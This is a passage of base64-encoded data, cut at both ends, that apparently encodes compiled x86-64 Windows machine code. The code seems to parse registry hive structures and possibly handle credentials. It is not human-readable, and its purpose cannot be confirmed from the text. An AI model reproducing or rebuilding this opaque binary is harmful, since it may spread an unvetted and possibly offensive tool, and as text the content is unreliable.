Ji0sISIsJ/xWgdgEASIsO/xXvdgEA6wW/AQAAAEiLXCRASItsJEhIi3QkUIvHSIPEMF/DzEBTSIPsIEiL2UiFyXRFgzkBdTVIi0EISIXAdCxIi0gISIXJdAb/Fd11AQBIi0sISIM5AHQJSIsJ/xU6dgEASItLCP8ViHYBAEiLy/8Vf3YBAOsCM8BIg8QgW8PMSIlcJBBEiUwkIFVWV0iD7EBIi7wkiAAAADPbSIvxSCEfiwlFi9lJi+hMi9KFyQ+EGAEAAIP5AQ+FPAEAAEiF0nUISItGCEyLUBi4bmsAAGZBOUIED4XoAAAATYXAD4TcAAAAQTlaGA+E1QAAAEGDeiD/D4TKAAAASItGCEljWiC6XAAAAEgDWBBJi8hIiVwkYP8VdXgBAEiJRCQwSIXAD4SHAAAASCvFuUAAAABI0fhIA8BIiYQkiAAAAEiNUAL/Fad1AQBIi9hIhcB0dUyLhCSIAAAASIvVSIvI6DIYAQBIi1QkYEyLw0iLzuiYAAAASIvQSIkHSIXAdCaLhCSAAAAATItEJDBEi0wkeEmDwAJIi85IiXwkKIlEJCDo3/7//0iLy/8VSnUBAOsWTIvFSIvTSIvO6E4AAABIiQfrA0yJFzPbSDkfD5XD6y1Ei4wkgAAAAEWLw0iL1UmLykiJfCQg/xVscQEAhcAPlMOF23UIi8j/FXt0AQCLw0iLXCRoSIPEQF9eXcNIiVwkCEiJbCQQSIl0JBhXQVRBVUFWQVdIg+wgD7dCBEyL8TPJTYv4SIv6SIvpPWxmAAB0Cz1saAAAD4WqAAAARIvhZjtKBg+DnQAAAEyNaghIO+kPhZAAAABJi0YISWNdAEgDWBC4bmsAAGY5QwR1YPZDBiAPt1NMdA5IjUtQ6LALAABIi/DrKEiDwgK5QAAAAP8VTHQBAEiL8EiFwHQxRA+3Q0xIjVNQSIvI6NkWAQBIhfZ0G0iL1kmLz/8VunYBAEiLzoXASA9E6/8VG3QBAA+3TwZB/8RJg8UIRDvhuQAAAAAPgmf///9Ii1wkUEiLdCRgSIvFSItsJFhIg8QgQV9BXkFdQVxfw8zMSIvESIlYCEiJaBBIiXAYSIl4IEFUSIPsYEUz5EyL0osRSYvxSYvoTIvJQYvcQTvUD4TZAAAAg/oBD4VFAQAATTvUdQhIi0EITItQGLhuawAAZkE5QgQPlMNBO9wPhCIBAABIi4wkmAAAAEk7zHQGQYtCGIkBSIuMJKAAAABJO8x0CEGLQjjR6IkBSIuMJLAAAABJO8x0BkGLQiiJAUiLjCS4AAAASTvMdAhBi0JA0eiJAUiLjCTAAAAASTvMdAZBi0JEiQFJO/QPhLYAAABBD7dCTov40e9NO8R0Lzk+QYvcD5fDQTvcdCJJY1I0TIvASYtBCEiLSBBIjVQKBEiLzeh5FQEAZkSJZH0AiT7rdUiLhCTAAAAATIlkJFhMiWQkUEiJRCRISIuEJLgAAABFM8lIiUQkQEiLhCSwAAAATIvGSIlEJDhIi4QkoAAAAEyJZCQwSIlEJChIi4QkmAAAAEiL1UmLykiJRCQg/xW/bgEAQTvED5TDQTvcdQiLyP8V3HEBAEyNXCRgi8NJi1sQSYtrGEmLcyBJi3soSYvjQVzDzMzMSIvESIlYCEiJaBBIiXAgTIlAGFdBVEFVQVZBV0iD7DBIi/KLEU2L0EUzwEyL4UGL2EmL6EE70A+EiQEAAIP6AQ+FvAEAAEk78HUISItBCEiLcBi4bmsAAGY5RgQPhaABAACLVihBO9APhJQBAACDfiz/D4SKAQAASItBCEhjTixFi/hIA0gQQTvQD4ZyAQAATIu0JJAAAABMjWkESTvoD4VdAQAASYtEJAhJY30ASAN4ELh2awAAZjlHBA+F7QAAAE070HR4D7dHBmZBO8B0d/ZHFAEPt9B0DkiNTxjooggAAEiL2OsrSIPCArlAAAAA/xU+cQEARTPASIvYSTvAdEZED7dHBkiNVxhIi8joyBMBAEUzwEk72HQtSItMJHBIi9P/FaRzAQAzyTvBSIvLSA9E7/8VA3EBAEUzwOsJZkQ5RwZID0TvSTvoQYvYD5XDQTvYdFmLfQgPuvcfTTvwdE1MOYQkiAAAAHRAQTk+QYvYD5PDQTvYdDIPumUIH3MGSI1VDOsSSYtEJAhIY1UMSItIEEiNVAoESIuMJIgAAABEi8foMhMBAEUzwEGJPkyLVCRwQf/HSYPFBEQ7figPgtj+///rPEiLhCSQAAAARTPJSYvSSIlEJChIi4QkiAAAAEiLzkiJRCQg/xWVbAEAM8k7wQ+UwzvZdQiLyP8Vum8BAEiLbCRoSIt0JHiLw0iLXCRgSIPEMEFfQV5BXUFcX8PMzMxIi8RIiVgISIloEEiJcBhIiXggQVRBVUFWSIPsQESLEUUz9k2L4UWL2EiL6kGL/kU71g+EBAEAAEGD+gEPhTkBAABEOXIYD4QvAQAARDtaGA+DJQEAAIN6IP8PhBsBAABIi0EISGNKIEyLQBBJA8gPt0EEPWxmAAB0Cz1saAAAD4X2AAAAZkQ5cQYPhOsAAAAPt0EGRDvYD4PeAAAASmNU2Qi4bmsAAEkD0GY5QgQPhccAAABNO84PhL4AAABIi7QkgAAAAEk79g+ErQAAAPZCBiB0PQ+3Wkw5HkAPl8dBO/50VUiNSlBIi9PocQYAAEiL6Ek7xnQ8TI0EG0iL0EmLzOiwEQEASIvN/xUJbwEA6yIPt1pM0es5HkAPl8dBO/50FkQPt0VMSIPCUEmLyeiDEQEAZkWJNFyJHus/TIuMJIAAAABMiXQkOEyJdCQwTYvEQYvTSIvNTIl0JChMiXQkIP8VGWsBAEE7xkAPlMdBO/51CIvI/xUdbgEASItcJGBIi2wkaEiLdCRwi8dIi3wkeEiDxEBBXkFdQVzDSIlcJAhIiWwkEEiJdCQYV0FUQVVBVkFXSIPsQEUz/0yL0osRTYvxRYvYTIvpQYvfQTvXD4SEAQAAg/oBD4XJAQAATTvXdQhIi0EITItQGLhuawAAZkE5QgQPhawBAABFOXooD4SiAQAARTtaKA+DmAEAAEGDeiz/D4SNAQAASItBCEyLQBBJY0IsSY0MALh2awAASmN8mQRJA/hmOUcED4VmAQAATTvPD4RdAQAASIu0JJAAAABJO/cPhEwBAABmRDl/Bg+EiQAAAPZHFAEPt1cGdBJIjU8YRI1iAejjBAAASIvo6zVEi+K5QAAAAEiDwgJB0exB/8T/FXZtAQBIi+hJO8cPhAEBAABED7dHBkiNVxhIi8jo/w8BAEk77w+E5wAAAEQ5Jg+Tw0E733QZRYvESIvVSYvOTQPA6NoPAQBFjVwk/0SJHkiLzf8VK20BAOsDRIk+QTvfD4SsAAAAi3cISIusJLAAAAAPuvYfSTvvD4SUAAAASIuMJKgAAABJO890NDl1AEGL3w+Tw0E733QmD7pnCB9zBkiNVwzrEUmLRQhMY0cMSItQEEmNVBAERIvG6GIPAQCJdQDrTkiLhCSwAAAATIuMJJAAAABNi8ZIiUQkOEiLhCSoAAAAQYvTSIlEJDBJi8pMiXwkKEyJfCQg/xXcaAEAQTvHD5TDQTvfdQiLyP8V8WsBAEyNXCRAi8NJi1swSYtrOEmLc0BJi+NBX0FeQV1BXF/DzEBTSIPsIESLATPbRYXAdAtBg/gBdR9Bi9jrGkiLyv8VnGgBAIXAD5TDhdt1CIvI/xWbawEAi8NIg8QgW8PMzMxIiVwkCEiJbCQQSIl0JBhXSIPsMEmL+EiL6kiL0TPbSIvPRI1DBP8VdGgBAEiL8Eg7w3QnSI1EJFhEjUskTIvFM9JIi85IiUQkIP8VYGgBAEiLzovY/xUtaAEASIvP/xUkaAEASItsJEhIi3QkUIvDSItcJEBIg8QwX8PMSIlcJAhIiXQkEFdIg+wgSIvxM9tIjRVxiwEARI1DATPJ/xX1ZwEASIv4SDvDdDpEjUMQSIvWSIvI/xXlZwEASIvwSDvDdBlFM8Az0kiLyP8V12cBAEiLzovY/xWsZwEASIvP/xWjZwEASIt0JDiLw0iLXCQwSIPEIF/DzEiJXCQISIl0JBBXSIPsIEiL+TPbSI0V9YoBAESNQwEzyf8VeWcBAEiL8Eg7w3Q3QbgAAAEASIvXSIvI/xVnZwEASIv4SDvDdBRIi8j/FUZnAQBIi8+L2P8VM2cBAEiLzv8VKmcBAEiLdCQ4i8NIi1wkMEiDxCBfw0iLxEiJWAhIiWgQSIlwGEiJeCBBVEiD7EBBi+iL+kyL4TPbSI0VbooBADPJRI1DAf8V8mYBAEiL8Eg7w3Q7RIvHSYvUSIvI/xXjZgEASIv4SDvDdBtMjUQkIIvVSIvI/xXjZgEASIvPi9j/FahmAQBIi87/FZ9mAQBIi2wkWEiLdCRgSIt8JGiLw0iLXCRQSIPEQEFcw8zMRTPJQY1RIEWNQQHpWP///0UzyUGNUUBFjUEC6Uj///9FM8lBjVFARY1BA+k4////RTPJTIvBZkQ5CXQ1QY1RAYQRdS0Pt0EChMJ1Jbn+AQAAZkE5CHMaZkE5AHcUD7fIQQ+3ACvIg/kIcwZNOUgIdQNBi9GLwsPMSIlcJBBXSIPsILgCAAAAM9tIi/mJRCQwZjkBdRFIi0EID7cI/xVOagEAO8N1Fg+3F0iLTwhMjUQkMP8VAGYBADvDdAW7AQAAAIvDSItcJDhIg8QgX8PMzEyL3EmJWwhXSIPsUDPbSY1D2EiL+UmJQ9BIi0EIiVwkMEmJW+BJiVvISYlT8EmJQ+hIiVkISDvDdDdmOVkCdDEPt1ECjUtA/xXjaAEASIlEJCBIO8N0GkQPt0cCSI1UJEBIjUwkIEiJRwjoZdD//4vYi8NIi1wkYEiDxFBfw8zMSIlcJAhIiXQkEFdIg+wgM9tIi/pIi/FIi8NIO8t0LUg703QoSI1UEgKNS0D/FX5oAQBIO8N0FUg7+3YQD74MM2aJDFhI/8NIO99y8EiLXCQwSIt0JDhIg8QgX8NIiVwkCEiJbCQQSIl0JCBXSIPsIEGL2UiL+kiL8UWFwHQsQYvoTI1EJEBIjRV7iAEASIvO6PsEAQBEilwkQEiDxgREiB9I/8dIg+0BdddIi2wkOEiLdCRIi8NIi1wkMEiDxCBfw8zMzEiLxEiJWAhIiWgQSIlwGEiJeCBBVEiD7CBBi8BMjSXpmwIAQYvwg+APM9vB7hBNiyTEi+pIi/mF0nQvD7YXSYvM6HrX//+F9nQXM9KNQwH39oXSdQxIjQ30hwEA6F/X////w0j/xzvdctFIi1wkMEiLbCQ4SIt0JEBIi3wkSEiDxCBBXMPMzMxIi8RIgexIAgAASIXJD4ShAAAASI1QCP8VV2YBAIXAD4SPAAAASI1UJDBIjYwkUAIAAP8VJGcBAIXAdHhIjUQkQEyNRCQwRTPJM9K5AAQAAMdEJCj/AAAASIlEJCD/FSFmAQCFwHRNSI1UJEBIjQ1ZhwEA6MDW//9IjUQkQEyNRCQwRTPJM9K5AAQAAMdEJCj/AAAASIlEJCD/Fd1lAQCFwHQRSI1UJEBIjQ0lhwEA6ITW//9IgcRIAgAAw0iD7DhIjVQkIOi6AAEAhcB4G0iNVCQgSI0NAocBAOhZ1v//SI1MJCDooQABAEiDxDjDzMxIg+woSI1UJDjokP8AAIXAdB5Ii1QkOEiNDcaGAQDoJdb//0iLTCQ4/xVOZgEA6xT/FdZlAQBIjQ23hgEAi9DoBNb//0iDxCjDzMzMSIvESIlYCEiJaBBIiXAgTIlAGFdBVEFVQVZBV0iD7DBMY9FIg8n/SYv4RTPAM8BJi/Fm8q9Mi/JNi/pI99FBi9hNi+BI/8lNO9BIiUwkIA+OzAAAAEuLFOZIg8n/M8BIi/pm8q9I99FI/8lIg/kBdn9mgzovdAZmgzotdXNIi8pMjWoCujoAAAD/FTloAQBFM8BIi+hJO8B1LUuLDOZBjVA9/xUgaAEARTPASIvoSTvAdRRIg8n/M8BJi/1m8q9I99FI/8nrCUiLzUkrzUjR+Ug7TCQgdRlMi8FIi0wkcEmL1f8V0GcBAEUzwEE7wHQNSf/ETTvnfSnpWP///0k78HQVSTvodBpIjUUCSIkGZkQ5AA+Vw+sFuwEAAABBO9h1Gkk78HQVSIuEJIAAAABJO8B0CEiJBrsBAAAASItsJGhIi3QkeIvDSItcJGBIg8QwQV9BXkFdQVxfw8zMSIvESIlYCEiJaBBIiXAYSIl4IEFUQVVBVkiD7DBJi/FNi+BMi+pMi/Ez//8VM2QBAIP4enVnSItsJHCNT0CLVQD/FYVkAQBIi9hIhcB0TkSLTQCNVwFMi8BJi85IiWwkIP8VNWEBAIXAdClIiwtFM8lNi8RJi9XoRAAAAIv4hcB0EkiF9nQNSIsLSIvW6GT9AACL+EiLy/8VN2QBAEiLXCRQSItsJFhIi3QkYIvHSIt8JGhIg8QwQV5BXUFcw8zMTIvcSYlbCEmJaxBJiXMYTYlLIFdIg+xQSY1D7DP2SIvaIXQkQCF0JHhJiUPYSY1DIEmL+EiL6UiL0UmJQ9BJIXPITY1L6EUzwDPJ/xWTYAEAhcAPhYUAAAD/FUVjAQCD+Hp1eotUJECNTkBIA9L/FZhjAQBIiQNIhcB0YotUJHiNTkBIA9L/FYBjAQBIiQdIhcB0PkyLA0iNTCRETI1MJEBIiUwkMEiNTCR4SIvVSIlMJCgzyUiJRCQg/xUkYAEAi/CFwHUYSIsP/xVFYwEASIkHSIsL/xU5YwEASIkDSItcJGBIi2wkaIvGSIt0JHBIg8RQX8PMzMxIiVwkEEiJbCQYSIl0JCBXSIPsIESLQVBIi/pIi+kz0rkABAAAuwEAAAD/FYRiAQBIi/BIhcB0OUyNRCQwjVMJSIvI/xWTXwEAhcB0G0yLRwiLVVBIi0wkMP8XSItMJDCL2P8VXGIBAEiLzv8VU2IBAEiLbCRASIt0JEiJXxCLw0iLXCQ4SIPEIF/DzEBTSIPsIIsSSYvYTYtACP8TiUMQSIPEIFvDzMxIiVwkIEiJVCQQVVZXQVRBVUFWQVdIg+wgRTPkTIv6SGP5QY1UJA5IjQ1egwEAQYv06ArS//9BjUwkAehEAQAASTv8SYvcSIl8JHAPjhMBAACB/hUAAEAPhAcBAABJixTfSI0NrIUBAOjT0f//SYsU32aDOiF0D0iLyujZAQAAi/Dp0gAAAEyNagJIjVQkYEGL9EmLzf8VYWIBAEGL7EyL8Ek7xA+ErgAAAEQ5ZCRgD46jAAAAQQ+3/LoBAAAATI09x3MBAGaD/xBzWkmLDkQPt+dJweQFS4tUPBD/FSNkAQAz7YXAQA+UxYXtdChLiwQ8SIXAdBCLTCRgSY1WCP/J/9CL8OsPQ4tMPAhFM8Az0ug3x///ugEAAABFM+RmA/pBO+x0oEyLfCRoQTvsdSRIg8n/M8BJi/1m8q9I99FIK8pJi9VEjUQJArkDwCIA6PnG//9Ii3wkcEj/w0g73w+M7f7//zPJ6BkAAABIi1wkeDPASIPEIEFfQV5BXUFcX15dw8zMSIlcJAhIiWwkEEiJdCQYV0iD7CCL+YXJdCtMjQWvnQIASI0VoJ0CAEiNDZ2dAgDo4PoAAIElkp0CAP8/AAC4KAAAAOsFuDAAAABIY+hIjR1ElAIAvg4AAABIiwNIiwwoSIXJdC//0YXAeSlMiwNIjQ1ThAEAhf9NiwBIjRVXhAEARIvISA9F0UiNDVmEAQDoKND//0iDwwhIg+4BdbuF/3UaSIsNZ5oCAEiFyXQG/xUUYgEASIMlVJoCAABIi1wkMEiLbCQ4SIt0JEAzwEiDxCBfw8xIi8RIiVgIVVZXQVRBVUFWQVdIg+wwM/ZIjVAYi/6JtCSIAAAA/xV5YAEATIvmSIl0JCBMi/ZMi+iL7ol0JHhIO8YPhPcCAAA5tCSAAAAAD47qAgAASIsISI0VAYQBAP8VN2IBAESNfgFIi9hIO8Z0ZUiL0I1OQEkrVQBI0fpIjVQSAv8Vi18BAEyL4EiJRCQgSDvGdERJi30AM8BIg8n/ZvKvTIvDTStFAEj30UmNQARJK89I0fiLwEg7wXMETI1zBEmLVQBJ0fhJi8xNA8Do5gEBAOsETYt1AEG/DgAAAA+3/kiNHdqSAgBBjUfzZkE7/w+DzQAAAEw75nQjD7fXSYvMSIsU00iLEv8VnGEBADvGuAEAAAB0B4vu6ZoAAACL6Ew79g+EjwAAAIN8JHgAD4WCAAAARA+3/0Uz5EqLFPtmO3IYc2ZIi1IgD7fGSYvOSI0EQEiJRCQoSItUwgj/FUdhAQBBi8xBO8QPlMGJTCR4QTvMdClKiwT7i4wkgAAAAEyLRCQoSItAIEmNVQj/yUL/FMCLTCR4iYQkiAAAALgBAAAAZgPwQTvMdJBMi2QkIEG/DgAAADP2ZgP4O+4PhCn///877nV2SI0NpIIBAEmL1OgQzv//QbwBAAAASIsTSI0N9IIBAEiLEuj4zf//SIsTSItSCEg71nQMSI0N6YIBAOjgzf//SIsDSItQEEg71nQMSI0N4YIBAOjIzf//SIPDCE0r/HW1SI0NSH4BAOizzf//TItkJCDp5wAAADl0JHgPhd0AAAC4//8AAEiNDb+CAQBJi9ZmA/gPt+9MiwTrTYsA6H7N//9IixTrSI0NJ4MBAEiLEuhrzf//SIsU60iLUghIO9Z0DEiNDSuDAQDoUs3//0iLBOtIi1AQSDvWdAxIjQ0ygwEA6DnN//9IjQ3CfQEA6C3N//9IiwzrRTP2ZkQ7cRhzUUWNZgFIi1EgD7fGSI0NAYIBAEiNPEBIi1T6COj/zP//SIsU60iLQiBIi1T4EEk71nQMSI0N6oEBAOjhzP//SIsM62ZBA/RmO3EYcrhMi2QkIEiNDVd9AQDowsz//0mLzP8V7VwBAEmLzf8V5FwBAIu8JIgAAACLx0iLXCRwSIPEMEFfQV5BXUFcX15dw8zMQFNIg+wgg2QkOABIjVQkOP8VNl0BAEiL2EiFwHQ4uv8AAAC5QAAAAEiJFcWWAgD/FYdcAQBIiQWwlgIASIXAdAyLTCQ4SIvT6AP6//9Ii8v/FW5cAQBIiwWPlgIASIPEIFvDzEBTSIPsIEiNDZuWAgDoGPYAADPbO8N8JUiLDYmWAgBMjQVWlgIASI0Vm48CAOjm9QAAO8MPncOJHWOWAgBIg8QgW8PMSIsNXZYCAOnU9QAASIPsSIM9RZYCAAC4KAAZwHQsSItEJHBIiUQkMEyJTCQoTIlEJCBMi8FIiw0olgIARIvKixXzlQIA6KL1AABIg8RIw8xIiVwkEFVWV0iD7EBIi/KFyQ+E7wAAAEhjyUyNRCRgSI1UJDBIi0zO+OgCvf//hcAPhLoAAACLfCRguUAAAACNbySL1f8VelsBAEiL2EiFwA+EjQAAAEiLVCQwSI1IJEyLx8cAFQAAAIl4HMdAICQAAADo8/0AAEiDPZWVAgAAdCBIjUQkcEyNTCR4TI1EJDiL1UiLy0iJRCQg6B3////rBbgoABnAhcB4IotUJHCF0ngRSIsWSI0NeIIBAOjXyv//6xdIjQ3aggEA6wmL0EiNDZ+DAQDovsr//0iLy/8V6VoBAEiLTCQw/xXeWgEA6yL/FWZaAQBIjQ03hAEAi9DolMr//+sMSI0Np4QBAOiGyv//M8BIi1wkaEiDxEBfXl3DzMzMTIvcSYlbCFdIg+xwM/8zwMdEJDgGAAAAiXwkPIl8JECJRCREZol8JEhmiXwkSkmJe9hmiXwkWGaJfCRaSIvaSYl76Eg5PaaUAgB0HkmNQxhNjUsgTY1DuI1XMEmNS8BJiUOo6DD+///rBbgoABnAO8d8JYuUJJAAAAA713wRSIsTSI0NiIQBAOjnyf//6xdIjQ3ahAEA6wmL0EiNDa+FAQDozsn//zPASIucJIAAAABIg8RwX8PMzEiJXCQIV0iB7DABAAAz/zPASI2MJIgAAAAz0kG4oAAAAMdEJEAEAAAAiXwkRIl8JEiJRCRMZol8JFBmiXwkUkiJfCRYiXwkYIl8JGSJfCRoSIl8JHBIiXwkeEiJvCSAAAAA6C38AABIOT3KkwIAdCtIjYQkUAEAAEyNjCRYAQAATI1EJDCNV0BIjUwkQEiJRCQg6En9//+L2OsFuygAGcBIjQ2xhQEA6BDJ//873w+MGAEAAIuUJFABAAA71w+M6gAAAEiLTCQwM9JIiwFIiYQkgAAAAEiLQQhIiYQkmAAAAEiLQRBIiYQksAAAAPMPb0EY8w9/hCSIAAAA8w9vSSjzD3+MJKAAAADzD29BOPMPf4QkuAAAAItBWImEJAgBAACLQUiJhCQMAQAAiYQk8AAAAItBTImEJPgAAABIi0FQSImEJAABAABIi0FoSImEJNgAAABIi0FwSImEJOAAAABIi0F4SImEJOgAAACLgYgAAACJhCQYAQAASIuBkAAAAEiNjCSAAAAASImEJCABAADoVxUAAEiNDQyFAQDoG8j//0iLTCQw6APyAADrLYH6DgMJgHUOSI0NbIUBAOj7x///6xdIjQ1+hQEA6wmL00iNDUOGAQDo4sf//zPASIucJEABAABIgcQwAQAAX8PMzMxIi8RIiVgIVVZXQVRBVUiD7HCDYMwAg2DQAEiDYIgATI0FuoYBAEUzycdAyA4AAADom/H//0iDPQuSAgAASGPYdCtIjYQkuAAAAEyNjCSwAAAATI1EJFBIjUwkYLoMAAAASIlEJCDohfv//+sFuCgAGcCFwA+I3QIAAIuUJLgAAACF0g+IxQIAAEiLTCRQM+1Mi+s5aQQPhqsCAAAz9kSLRA5gQYvI6HEWAABIjQ0+hgEAi9VMi8joEMf//0iNDV2GAQDoBMf//0iLRCRQSI1cbQBIweMFSI1MA0jotO///0iNDXGGAQDo4Mb//0yLXCRQSo1MG1Dome///0iNDVaGAQDoxcb//0yLXCRQSo1MG1jofu///0yLXCRQSI0NRoYBAE6NRBs4So1UGyjom8b//0yLXCRQSI0Ne4YBAE6NRBsYSo1UGwjogMb//0yLXCRQSI0NqIYBAEKLVB5k6GrG//9Mi1wkUEKLTB5k6LcUAABNhe0PhK0BAABIi0QkUA+3TAYqg8FAiYwksAAAAIvRuUAAAAD/FV1WAQBIi/hIhcAPhIABAADHAAgAAADHQCQIAAAASItMJFCLVA5kiVAgSItMJFDzD29EDihIjUhA8w9/QBBED7dAEkiJSBhIi1QkUEiLVBYw6LL4AABIgz1UkAIAAHQri5QksAAAAEiNhCS4AAAATI2MJLAAAABMjUQkWEiLz0iJRCQg6NH5///rBbgoABnAhcAPiOIAAACLlCS4AAAAhdIPiMoAAABIi0QkULoAIAAAuUAAAABMjWQGCP8VoVUBAEiL2EiFwA+EmAAAAEmNTCQwSI0FwYUBAEmNVCQgSIlEJEBIiUwkOEGLTCRcSIlUJDBMjQVRiQEATIlkJCiJTCQgRIvNugAQAABIi8voEPIAAEiLy4XAfgfohLf//+sJ/xVEVQEASIvYSIXbdDdIi1QkWEiLy0SLgogAAABIi5KQAAAA6CG1//+FwHQPSI0NVoUBAEiL0+jaxP//SIvL/xUFVQEASItMJFjoue4AAOsXSI0NeoUBAOsJi9BIjQ1PhgEA6K7E//9Ii8//FdlUAQBIjQ0udQEA6JnE//9Ii0wkUP/FSIPGYDtpBA+CV/3//+hy7gAA6xdIjQ3jhgEA6wmL0EiNDbiHAQDoZ8T//zPASIucJKAAAABIg8RwQV1BXF9eXcPMTIvcSYlbCEmJaxBWV0FUQVVBVkiB7IAAAAAzwEUz9k2NS6hJiUPBRYhzwIlEJHFmiUQkdYhEJHdIjQVViAEATI0FbogBAEiL+ovZSIlEJCBBvfQBAABNi+bo9u3//0yNjCTAAAAATI0FV4gBAEiL14vLTIl0JCDo2O3//0E7xnU0TI2MJMAAAABMjQXseQEASIvXi8tMiXQkIOi17f//QTvGdRFIjQ0hjQEA6KDD///pigMAAEyNTCRITI0FE4gBAEiL14vLTIl0JCDohO3//0E7xg+ERAMAAEyNTCRATI0F/4cBAEiL14vLTIl0JCDoYO3//0E7xg+EFwMAAEiLTCRASI1UJFjooOwAAEE7xg+E6QIAAEyNjCTIAAAATI0FyIcBAEiL14vLTIl0JCDoIe3//0E7xg+EoQIAAEyNTCRgTI0FtIcBAEiL14vLTIl0JCDo/ez//0E7xnQTSItMJGBFM8Az0v8VkFUBAESL6EyNTCRgTI0FiYcBAEiL14vLTIl0JCDoyuz//0E7xg+EuQAAAEiLfCRgQYv2SIvfSTv+D4S7AAAAZkQ5M3QxRTPAM9JIi8v/FUFVAQBBO8Z0Av/GuiwAAABIi8v/FUxVAQBIi9hJO8Z0BkiDwwJ1yUE79nR/i9a5QAAAAEjB4gP/FYhSAQBMi+BJO8Z0V0GL7kiL2GZEOTd0Szvuc0dFM8Az0kiLz/8V4lQBAEE7xnQPx0MEBwAAAIkD/8VIg8MIuiwAAABIi8//FeBUAQBIi/hJO8Z0D0iDxwJ1uOsHi7QkwAAAAEE79nQKTTvmdAVJi9zrDEiNHZOFAgC+BQAAAEiLvCTIAAAASIPJ/zPAZvKvSPfRSP/JSIP5IA+UwEE7xg+EOgEAAEiLjCTIAAAASI1UJGhEi8hBuBAAAADoeOn//0E7xg+EFgEAAEyLTCRATItEJEhIi5QkwAAAAEiNDUqGAQBEiWwkIOh0wf//SI0NuYYBAOhowf//QTv2dh5Ii/uL7kiLF0iNDcCGAQDoT8H//0iDxwhIg+0BdedIjQ2yhgEA6DnB//9FM8BIjUwkaEGNUBDoaOn//0iNDbFxAQDoHMH//0iLVCRQSI0NpIYBAOgLwf//TItEJFhIi1QkSEiLjCTAAAAAiXQkMEyNTCRoSIlcJChEiWwkIOjxAAAASTvGdFL2QAGAdBIPt0gCZsHJCEQPt8FBg8AE6wlED7ZAAUGDwAJIi0wkUEiL0OjisP//QTvGdAlIjQ1ehgEA6yb/FV5QAQBIjQ2PhgEAi9DojMD//+srSI0N/4YBAOsHSI0NVocBAOh1wP//6xRIjQ3ohwEA6GfA//9Ii5wkwAAAAEiLTCRY/xWIUAEA6zP/FRBQAQBIjQ0xiAEAi9DoPsD//+sVSI0N0YgBAOsHSI0NOIkBAOgnwP//SIucJMAAAABNO+Z0CUiLy/8VRVABAEyNnCSAAAAAM8BJi1swSYtrOEmL40FeQV1BXF9ew8zMzEiJXCQISIl0JBBXQVRBVUFWQVdIgexAAgAASIvZSYvwSIv6RTP2SI1MJFgz0kG4oAAAAE2L6U2L5kyJdCRQ6IXyAABIjYwkBAEAADPSQbg0AQAA6HDyAABIjUwkMP8VuU4BAEGNVhhmRIl0JD6NSij/FaZPAQBIiYQkgAAAAEk7xnQnQY1OAUiL02aJSAJIi4QkgAAAAGaJCEiLjCSAAAAASIPBCOh06QAAuigAAACNShj/FWRPAQBBvwIAAABIiUQkUEk7xnQ5ZkSJeAJIi0QkUEiNFbODAQBmRIk4SItMJFBIg8EI6DPpAABIi0wkUEiL10iDwRjoIukAAEiLRCRQ8w9vQBi4FwAAAMeEJNgAAAAAAOBAjVj5jUgpRIm8JOAAAADzD3+EJIgAAADzD39EJHDzD39EJFhIi9OJhCTAAAAAiYQk3AAAAImcJMgAAAD/FcVOAQBIiYQk0AAAAEk7xnQXRIuEJMgAAABIjRW5ZwEASIvI6EfxAABIjZQkqAAAAEiNTCQw/xWWTQEAZoNEJDAKSI2UJLAAAABIjUwkMP8VfU0BAGaDRCQwCkiNlCS4AAAASI1MJDD/FWRNAQBIi4wkmAIAAEyLnCSoAAAASLj/////////f0iJjCSgAQAATI2EJJACAABIiYQkCAEAAEiJhCQQAQAASImEJBgBAABIiYQkIAEAAEiJhCQoAQAASIuEJIAAAABIjZQkgAIAAEyJnCQAAQAASIm0JOABAADzD29ACPMPf4QkMAEAAIuEJJACAADHhCTwAQAAEAIAAImEJJQBAACLAUiNjCQAAQAAiYQkmAEAAIuEJKACAACJhCScAQAA6AcCAABBO8YPhJUBAABIjQ1PhwEA6F69//+LlCSQAgAASIuMJIACAABEi8tNi8Xo5AMAAEE7xg+MWAEAAEiNDUiHAQDoL73//0SLhCSQAgAASIuUJIACAABIjUwkUOgxFgAASIvwSTvGD4QmAQAASI0NNocBAOj9vP//9kYBgHQQD7dGAmbByAgPt9iDwwTrBw+2XgFBA9+LjCTcAAAASI2UJJgCAADoRuYAAEE7xov4D4zHAAAASIuEJJgCAABMjUwkQEWLx7oQAAAASYvN/1AoQTvGi/gPjKEAAABIi4QkmAIAALlAAAAAi1AQA9P/Fa9MAQBIiYQk8AAAAEk7xnQ7SI2MJOgAAABMi8hIi4QkmAIAAEiJTCQgSItMJEBEi8NIi9b/UDBBO8aL+H0OSIuMJPAAAAD/FW9MAQBIi4QkmAIAAEiNTCRA/1BAQTv+fCxIjQ2LhgEA6Bq8//9IjUwkUOiMDgAATIvgSTvGdBxIjQ2lhgEA6Py7///rDkiNDc+GAQCL1+jsu///SIvO/xUXTAEASIuMJIACAAD/FQlMAQBIi4wk8AAAAEk7znQG/xX2SwEASIuMJNAAAABJO850Bv8V40sBAEiLjCSAAAAASTvOdAb/FdBLAQBIi0wkUEk7znQG/xXASwEATI2cJEACAABJi8RJi1swSYtzOEmL40FfQV5BXUFcX8NMi9xNiUMYSYlTEFNVVldBVEFVQVZBV0iD7EhFM/YzwMdEJCB2////RYhznEmJQ52JRCQtZolEJDGIRCQzTY1DCEmNUyBmRYlzrGZFiXOuTIvhRYv+TYlzIEWJcwhBi95Bi/botAMAAESLrCSQAAAAQTvGdBBBi8VBi92D4Ad0BSvYg8MIQQ+3bCQwuUAAAACDxQqL1f8V/UoBAEiL+Ek7xnQuSYsEJEUPt0QkMEmLVCQ4SIkHSI1PCmZEiUcI6HvtAACLxYv1g+AHdAUr8IPGCEyLtCSoAAAATYX2D4QHAQAASIX/D4T1AAAASIuUJKAAAACNRB54uUAAAACJAovQ/xWSSgEATIvgSIuEJJgAAABMiSBNheQPhMMAAABFIXwkBEWJbCQMQccEJAQAAABBvwEAAABJjUwkSEmL1kWJfCQIScdEJBBIAAAARYtEJAzo6ewAAEGJbCQcQcdEJBgKAAAAi9NJA1QkEEmJVCQgRYtEJBxKjQwiSIvX6L7sAABBjV8Ti9ZBiVwkLEHHRCQoBgAAAEkDVCQgSYlUJDBFi0QkLEqNDCJIjVQkIOiN7AAAQYlcJDxBx0QkOAcAAABJi0QkMEiNVCQgSIPAGEmJRCRARYtEJDxKjQwg6F7sAABJi87/FbdJAQBIhf90CUiLz/8VqUkBAEGLx0iDxEhBX0FeQV1BXF9eXVvDzEiJXCQQSIlsJBhIiXQkIFdBVEFVSIPsMDP2M+1FM9JNi+BEi+pIi/m7JQIAwDkxD4bVAAAATI1JCEGDOQZ0BkGDOQd1IEmLQQhIjUwHB